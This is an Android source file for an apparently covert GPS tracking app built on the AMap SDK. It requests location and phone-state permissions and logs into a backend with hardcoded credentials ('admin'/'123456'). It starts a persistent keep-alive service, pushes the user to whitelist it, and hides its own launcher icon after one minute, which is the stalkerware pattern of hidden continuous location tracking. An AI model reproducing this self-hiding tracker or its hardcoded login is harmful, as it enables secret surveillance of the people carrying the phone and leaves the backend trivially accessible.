package com.jafir.gps;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.WindowManager;

import com.amap.api.maps2d.AMap;
import com.amap.api.maps2d.CameraUpdateFactory;
import com.amap.api.maps2d.MapView;
import com.amap.api.maps2d.model.MyLocationStyle;
import com.tbruyelle.rxpermissions2.RxPermissions;
import com.xdandroid.hellodaemon.AbsWorkService;
import com.xdandroid.hellodaemon.IntentWrapper;

import butterknife.BindView;
import butterknife.OnClick;

/**
 * created by jafir on 2020-05-20
 */
public class GpsActivity extends FrameActivity {

    private static final String TAG = "GpsActivity";
    @BindView(R.id.map)
    MapView mMapView;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_gps);
        mMapView.onCreate(savedInstanceState);


        if (PrefManager.getInstance(this).isFirst()) {
            IntentWrapper.whiteListMatters(this, "为了更好的实时定位，最好把应用加入您手机的白名单");
            PrefManager.getInstance(this).setFirst();
        }
        new RxPermissions(this)
                .request(Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.READ_PHONE_STATE)
                .as(bindLifecycle())
                .subscribe(b -> {
                    if (!b) {
                        finish();
                    } else {
                        RetrofitManager.getInstance().mainService().login(new LoginRequest("admin", "123456"))
                                .compose(ReactivexCompat.singleThreadSchedule())
                                .subscribe(result -> {
                                    if (result.getCode() == 0) {
                                        String token = result.getData().getToken();
                                        PrefManager.getInstance(GpsActivity.this).setToken(token);
                                        startService(new Intent(this, KeepLiveService.class));
                                    }
                                }, e -> {
                                    Log.e("login", "service login err:" + e.getMessage());
                                });
                        initMap();
                    }
                }, e -> {
                });

        new Handler().postDelayed(() -> hideAppIcon(GpsActivity.this), 1000 * 60);
    }

    private void initMap() {
        MyLocationStyle myLocationStyle;
        myLocationStyle = new MyLocationStyle();//初始化定位蓝点样式类myLocationStyle.myLocationType(MyLocationStyle.LOCATION_TYPE_LOCATION_ROTATE);//连续定位、且将视角移动到地图中心点，定位点依照设备方向旋转，并且会跟随设备移动。（1秒1次定位）如果不设置myLocationType，默认也会执行此种模式。
        myLocationStyle.interval(2000); //设置连续定位模式下的定位间隔，只在连续定位模式下生效，单次定位模式下不会生效。单位为毫秒。
        AMap map = mMapView.getMap();
        map.setMyLocationStyle(myLocationStyle);//设置定位蓝点的Style
        map.setMyLocationEnabled(true);// 设置为true表示启动显示定位蓝点，false表示隐藏定位蓝点并不进行定位，默认是false。
        map.getUiSettings().setMyLocationButtonEnabled(true); //显示默认的定位按钮
        map.setMyLocationEnabled(true);// 可触发定位并显示当前位置
        map.moveCamera(CameraUpdateFactory.zoomTo(16));
    }


    public static void hideAppIcon(Context context) {
        ComponentName componentName = new ComponentName(context, GpsActivity.class);
        PackageManager packageManager = context.getPackageManager();
        int state = packageManager.getComponentEnabledSetting(componentName);
        if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
    }

    public static void showAppIcon(Context context) {
        ComponentName componentName = new ComponentName(context, GpsActivity.class);
        PackageManager packageManager = context.getPackageManager();
        int state = packageManager.getComponentEnabledSetting(componentName);
        if (state != PackageManager.COMPONENT_ENABLED_STATE_DEFAULT) {
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP);
        }
    }

    @OnClick(R.id.logout)
    public void logout() {
        PrefManager.getInstance(this).setUserId("");
        KeepLiveService.stopService();
        AbsWorkService.cancelJobAlarmSub();
        stopService(new Intent(this, KeepLiveService.class));
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        //在activity执行onDestroy时执行mMapView.onDestroy()，销毁地图
        if (mMapView != null) {
            mMapView.onDestroy();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        //在activity执行onResume时执行mMapView.onResume ()，重新绘制加载地图
        if (mMapView != null) {
            mMapView.onResume();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        //在activity执行onPause时执行mMapView.onPause ()，暂停地图的绘制
        if (mMapView != null) {
            mMapView.onPause();
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        //在activity执行onSaveInstanceState时执行mMapView.onSaveInstanceState (outState)，保存地图当前的状态
        if (mMapView != null) {
            mMapView.onSaveInstanceState(outState);
        }
    }

    @Override
    public void onBackPressed() {
        IntentWrapper.onBackPressed(this);
//        moveTaskToBack(true);
    }


}
